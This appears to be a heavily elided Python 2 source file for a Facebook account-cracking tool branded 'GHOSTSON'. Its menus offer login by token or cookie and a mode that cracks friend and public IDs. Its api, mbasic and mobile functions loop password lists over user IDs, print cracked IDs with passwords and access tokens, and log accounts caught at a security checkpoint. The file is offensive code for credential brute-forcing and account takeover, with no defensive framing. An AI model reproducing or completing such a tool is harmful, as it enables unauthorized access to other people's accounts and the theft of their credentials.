...
def login():
    ...
    print ' %s[%s1%s] Login with token %s(%sby GHOSTSON%s)\n\n%s [%s2%s] Login with cookie %s(by WIZARD)\n\n%s [%s3%s] How to Get Access Token\n\n%s ' % (p, k, p, h, p, h, p, k, p, m, p, k, p, p)
...
def menu():
    ...
    print '\x1b[1;93m '
    print '%s [%s01%s] Crack From %sGHOSTSON frind and public id ' % (p, k, p, h)
...
def api(uid, pwcuk):
    ...
    sys.stdout.write('\r [GHOSTSON_Crack] %s/%s GHOSTSON-Ok:-%s - GHOSTSON-CP :-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwcuk:
        pw = pw.lower()
        ...
        if 'session_key' in send.text and 'EAAA' in send.text:
            print '\r \x1b[1;32m[GHOSTSON-Ok] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ...
            try:
                ...
                with requests.Session() as (ses):
                    ...
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [GHOSTSON-CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
            ...
            print '\r\x1b[1;33m [GHOSTSON-CP ] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s | %s' % (uid, pw))
...
def mbasic(uid, pwcuk):
    ...
    sys.stdout.write('\r %s[Crack] %s/%s GHOSTSON-Ok:-%s - GHOSTSON-CP:-%s ' % (rm, loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwcuk:
        kwargs = {}
        pw = pw.lower()
...
def mobile(uid, pwcuk):
    ...
    sys.stdout.write('\r [Crack] %s/%s GHOSTSON-Ok:-%s - GHOSTSON-CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in pwcuk:
        kwargs = {}
        pw = pw.lower()
